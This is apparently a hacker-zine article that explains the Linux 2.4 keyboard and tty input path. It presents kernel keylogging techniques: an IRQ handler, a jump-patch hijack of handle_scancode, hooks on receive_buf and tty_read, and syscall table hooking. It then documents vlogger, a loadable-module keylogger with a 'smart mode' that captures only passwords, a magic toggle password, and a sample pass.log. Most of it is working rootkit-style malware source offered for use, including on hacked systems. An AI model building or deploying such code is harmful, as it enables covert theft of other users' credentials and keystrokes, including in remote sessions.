--[ 1 - Introduction

  This article is divided into two parts.  The first part of the paper
gives an overview on how the linux keyboard driver work, and discusses
methods that can be used to create a kernel based keylogger.  This part
will be useful for those who want to write a kernel based keylogger, or to
write their own keyboard driver (for supporting input of non-supported
language in linux environment, ...) or to program taking advantage of many
features in the Linux keyboard driver.

  The second part presents detail of vlogger, a smart kernel based linux
keylogger, and how to use it.  Keylogger is a very interesting code being
used widely in honeypots, hacked systems, ... by white and black hats.  As
most of us known, besides user space keyloggers (such as iob, uberkey,
unixkeylogger, ...), there are some kernel based keyloggers.  The earliest
kernel based keylogger is linspy of halflife which was published in Phrack
50 (see [4]).  And the recent kkeylogger is presented in 'Kernel Based
Keylogger' paper by mercenary (see [7]) that I found when was writing this
paper.  The common method of those kernel based keyloggers using is to log
user keystrokes by intercepting sys_read or sys_write system call.
However, this approach is quite unstable and slowing down the whole system
noticeably because sys_read (or sys_write) is the generic read/write
function of the system; sys_read is called whenever a process wants to read
something from devices (such as keyboard, file, serial port, ...).  In
vlogger, I used a better way to implement it that hijacks the tty buffer
processing function.

  The reader is supposed to possess the knowledge on Linux Loadable Kernel
Module.  Articles [1] and [2] are recommended to read before further
reading.


--[ 2 - How Linux keyboard driver work

  Lets take a look at below figure to know how user inputs from console
keyboard are processed:

  _____________            _________             _________         
 /             \ put_queue|         |receive_buf|         |tty_read
/handle_scancode\-------->|tty_queue|---------->|tty_ldisc|------->
\               /         |         |           |buffer   |        
 \_____________/          |_________|           |_________|        

     _________          ____________
    |         |sys_read|            |
--->|/dev/ttyX|------->|user process|
    |         |        |            |
    |_________|        |____________|


                            Figure 1

  First, when you press a key on the keyboard, the keyboard will send
corresponding scancodes to keyboard driver.  A single key press can produce
a sequence of up to six scancodes.

  The handle_scancode() function in the keyboard driver parses the stream
of scancodes and converts it into a series of key press and key release
events called keycode by using a translation-table via kbd_translate()
function.  Each key is provided with a unique keycode k in the range 1-127.
Pressing key k produces keycode k, while releasing it produces keycode
k+128. 

  For example, keycode of 'a' is 30. Pressing key 'a' produces keycode 30.
Releasing 'a' produces keycode 158 (128+30).

  Next, keycodes are converted to key symbols by looking them up on the
appropriate keymap.  This is a quite complex process. There are eight
possible modifiers (shift keys - Shift , AltGr, Control, Alt, ShiftL,
ShiftR, CtrlL and CtrlR), and the combination of currently active modifiers
and locks determines the keymap used.

  After the above handling, the obtained characters are put into the raw
tty queue - tty_flip_buffer.

  In the tty line discipline, receive_buf() function is called periodically
to get characters from tty_flip_buffer then put them into tty read queue.

  When user process want to get user input, it calls read() function on
stdin of the process. sys_read() function will calls read() function
defined in file_operations structure (which is pointed to tty_read) of
corresponding tty (ex /dev/tty0) to read input characters and return to the
process.

  The keyboard driver can be in one of 4 modes:
	- scancode (RAW MODE): the application gets scancodes for input.  
	It is used by applications that implement their own keyboard 
	driver (ex: X11)

	- keycode (MEDIUMRAW MODE): the application gets information on
	which keys (identified by their keycodes) get pressed and 
	released.

	- ASCII (XLATE MODE): the application effectively gets the 
	characters as defined by the keymap, using an 8-bit encoding.

	- Unicode (UNICODE MODE): this mode only differs from the ASCII 
	mode by allowing the user to compose UTF8 unicode characters by 
	their decimal value, using Ascii_0 to Ascii_9, or their 
	hexadecimal (4-digit) value, using Hex_0 to Hex_9.  A keymap can 
	be set up to produce UTF8 sequences (with a U+XXXX pseudo-symbol, 
	where each X is an hexadecimal digit). 

  Those modes influence what type of data that applications will get as
keyboard input.  For more details on scancode, keycode and keymaps, please
read [3].


--[ 3 - Kernel based keylogger approaches

  We can implement a kernel based keylogger in two ways by writing our own
keyboard interrupt handler or hijacking one of input processing functions. 


----[ 3.1 - Interrupt handler

  To log keystrokes, we will use our own keyboard interrupt handler.  Under
Intel architectures, the IRQ of the keyboard controlled is IRQ 1.  When
receives a keyboard interrupt, our own keyboard interrupt handler read the
scancode and keyboard status.  Keyboard events can be read and written via
port 0x60(Keyboard data register) and 0x64(Keyboard status register).

/* below code is intel specific */
#define KEYBOARD_IRQ 1 
#define KBD_STATUS_REG 0x64 
#define KBD_CNTL_REG 0x64 
#define KBD_DATA_REG 0x60 

#define kbd_read_input() inb(KBD_DATA_REG) 
#define kbd_read_status() inb(KBD_STATUS_REG) 
#define kbd_write_output(val) outb(val, KBD_DATA_REG) 
#define kbd_write_command(val) outb(val, KBD_CNTL_REG) 

/* register our own IRQ handler */
request_irq(KEYBOARD_IRQ, my_keyboard_irq_handler, 0, "my keyboard", NULL);

In my_keyboard_irq_handler():
	scancode = kbd_read_input(); 
	key_status = kbd_read_status(); 
	log_scancode(scancode);

  This method is platform dependent.  So it won't be portable among
platforms.  And you have to be very careful with your interrupt handler if
you don't want to crash your box ;)


----[ 3.2 - Function hijacking

   Based on the Figure 1, we can implement our keylogger to log user inputs
by hijacking one of handle_scancode(), put_queue(), receive_buf(),
tty_read() and sys_read() functions.  Note that we can't intercept
tty_insert_flip_char() function because it is an INLINE function.


------[ 3.2.1 - handle_scancode

  This is the entry function of the keyboard driver (see keyboard.c).  It
handles scancodes which are received from keyboard.

# /usr/src/linux/drives/char/keyboard.c
void handle_scancode(unsigned char scancode, int down);

  We can replace original handle_scancode() function with our own to logs
all scancodes.  But handle_scancode() function is not a global and exported
function.  So to do this, we can use kernel function hijacking technique
introduced by Silvio (see [5]).

/* below is a code snippet written by Plasmoid */
static struct semaphore hs_sem, log_sem;
static int logging=1;

#define CODESIZE 7
static char hs_code[CODESIZE];
static char hs_jump[CODESIZE] =
       "\xb8\x00\x00\x00\x00"      /*      movl   $0,%eax  */
       "\xff\xe0"                  /*      jmp    *%eax    */
   ;

void (*handle_scancode) (unsigned char, int) =
        (void (*)(unsigned char, int)) HS_ADDRESS;

void _handle_scancode(unsigned char scancode, int keydown)
{
       if (logging && keydown)
          log_scancode(scancode, LOGFILE);
    
       /*
        * Restore first bytes of the original handle_scancode code.  Call
        * the restored function and re-restore the jump code.  Code is
        * protected by semaphore hs_sem, we only want one CPU in here at a
        * time.
        */     
       down(&hs_sem);
    
       memcpy(handle_scancode, hs_code, CODESIZE);
       handle_scancode(scancode, keydown);
       memcpy(handle_scancode, hs_jump, CODESIZE);
    
       up(&hs_sem);
}

HS_ADDRESS is set by the Makefile executing this command
HS_ADDRESS=0x$(word 1,$(shell ksyms -a | grep handle_scancode))

  Similar to method presented in 3.1, the advantage of this method is the
ability to log keystrokes under X and the console, no matter if a tty is
invoked or not.  And you will know exactly what key is pressed on the
keyboard (including special keys such as Control, Alt, Shift, Print Screen,
...).  But this method is platform dependent and won't be portable among
platforms.  This method also can't log keystroke of remote sessions and is
quite complex for building an advance logger.


------[ 3.2.2 - put_queue

  This function is called by handle_scancode() function to put characters
into tty_queue. 

# /usr/src/linux/drives/char/keyboard.c
void put_queue(int ch);
 
  To intercept this function, we can use the above technique as in section
(3.2.1).


------[ 3.2.3 - receive_buf

  receive_buf() function is called by the low-level tty driver to send
characters received by the hardware to the line discipline for processing.

# /usr/src/linux/drivers/char/n_tty.c */
static void n_tty_receive_buf(struct tty_struct *tty, const 
				unsigned char *cp, char *fp, int count)

cp is a pointer to the buffer of input character received by the device.
fp is a pointer to a pointer of flag bytes which indicate whether a
character was received with a parity error, etc.

Lets take a deeper look into tty structures

# /usr/include/linux/tty.h
struct tty_struct {
	int	magic;
	struct tty_driver driver;
	struct tty_ldisc ldisc;
	struct termios *termios, *termios_locked;
	...
}

# /usr/include/linux/tty_ldisc.h
struct tty_ldisc {
	int	magic;
	char	*name;
	...	
	void	(*receive_buf)(struct tty_struct *, 
			const unsigned char *cp, char *fp, int count);
	int	(*receive_room)(struct tty_struct *);
	void	(*write_wakeup)(struct tty_struct *);
};

  To intercept this function, we can save the original tty receive_buf()
function then set ldisc.receive_buf to our own new_receive_buf() function
in order to logging user inputs. 

Ex: to log inputs on the tty0

int fd = open("/dev/tty0", O_RDONLY, 0);
struct file *file = fget(fd);
struct tty_struct *tty = file->private_data;
old_receive_buf = tty->ldisc.receive_buf;
tty->ldisc.receive_buf = new_receive_buf;

void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
						char *fp, int count)
{	
	logging(tty, cp, count); 	//log inputs

	/* call the original receive_buf */
	(*old_receive_buf)(tty, cp, fp, count);
}


------[ 3.2.4 - tty_read

  This function is called when a process wants to read input characters
from a tty via sys_read() function.

# /usr/src/linux/drives/char/tty_io.c
static ssize_t tty_read(struct file * file, char * buf, size_t count, 
				loff_t *ppos)

static struct file_operations tty_fops = {
	llseek:		tty_lseek,
	read:		tty_read,
	write:		tty_write,
	poll:		tty_poll,
	ioctl:		tty_ioctl,
	open:		tty_open,
	release:	tty_release,
	fasync:		tty_fasync,
};

To log inputs on the tty0:

int fd = open("/dev/tty0", O_RDONLY, 0);
struct file *file = fget(fd);	
old_tty_read = file->f_op->read;
file->f_op->read = new_tty_read;


------[ 3.2.5 - sys_read/sys_write

  We will intercept sys_read/sys_write system calls to redirect it to our
own code which logs the content of the read/write calls.  This method was
presented by halflife in Phrack 50 (see [4]).  I highly recommend reading
that paper and a great article written by pragmatic called "Complete Linux
Loadable Kernel Modules" (see [2]).

The code to intercept sys_read/sys_write will be something like this:

extern void *sys_call_table[];
original_sys_read = sys_call_table[__NR_read];
sys_call_table[__NR_read] = new_sys_read;


--[ 4 - vlogger

  This part will introduce my kernel keylogger which is used method
described in section 3.2.3 to acquire more abilities than common keyloggers
used sys_read/sys_write systemcall replacement approach.  I have tested the
code with the following versions of linux kernel: 2.4.5, 2.4.7, 2.4.17 and
2.4.18. 


----[ 4.1 - The syscall/tty approach

  To logging both local (logged from console) and remote sessions, I chose
the method of intercepting receive_buf() function (see 3.2.3).

  In the kernel, tty_struct and tty_queue structures are dynamically
allocated only when the tty is open.  Thus, we also have to intercept
sys_open syscall to dynamically hooking the receive_buf() function of each
tty or pty when it's invoked.

// to intercept open syscall
original_sys_open = sys_call_table[__NR_open];
sys_call_table[__NR_open] = new_sys_open;

// new_sys_open()
asmlinkage int new_sys_open(const char *filename, int flags, int mode)
{
...
	// call the original_sys_open
	ret = (*original_sys_open)(filename, flags, mode);
	
	if (ret >= 0) {
		struct tty_struct * tty;
...
		file = fget(ret);
		tty = file->private_data;
		if (tty != NULL && 
...
			tty->ldisc.receive_buf != new_receive_buf) {
...
				// save the old receive_buf			
				old_receive_buf = tty->ldisc.receive_buf;
...

		       /* 
		        * init to intercept receive_buf of this tty
		        * tty->ldisc.receive_buf = new_receive_buf;
		        */
			init_tty(tty, TTY_INDEX(tty));
		}
...
}

// our new receive_buf() function
void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
						char *fp, int count)
{
	if (!tty->real_raw && !tty->raw)	// ignore raw mode
		// call our logging function to log user inputs 
		vlogger_process(tty, cp, count); 
	// call the original receive_buf
	(*old_receive_buf)(tty, cp, fp, count);
}


----[ 4.2 - Features

  - Logs both local and remote sessions (via tty & pts)

  - Separate logging for each tty/session.  Each tty has their own logging
    buffer.

  - Nearly support all special chars such as arrow keys (left, right, up,
    down), F1 to F12, Shift+F1 to Shift+F12, Tab, Insert, Delete, End,
    Home, Page Up, Page Down, BackSpace, ... 

  - Support some line editing keys included CTRL-U and BackSpace.

  - Timestamps logging, timezone supported (ripped off some codes from
    libc).

  - Multiple logging modes

	o dumb mode: logs all keystrokes

	o smart mode: detects password prompt automatically to log
	user/password only.  I used the similar technique presented in
	"Passive Analysis of SSH (Secure Shell) Traffic" paper by Solar
	Designer and Dug Song (see [6]).  When the application turns input
	echoing off, we assume that it is for entering a password.

	o normal mode: disable logging

You can switch between logging modes by using a magic password.

#define VK_TOGLE_CHAR	29	// CTRL-]
#define MAGIC_PASS	"31337"	// to switch mode, type MAGIC_PASS 
				// then press VK_TOGLE_CHAR key

----[ 4.3 - How to use

Change the following options

// directory to store log files
#define LOG_DIR "/tmp/log"

// your local timezone
#define TIMEZONE	7*60*60	// GMT+7

// your magic password
#define MAGIC_PASS	"31337" 

Below is how the log file looks like:

[root@localhost log]# ls -l
total 60
-rw-------    1 root     root          633 Jun 19 20:59 pass.log
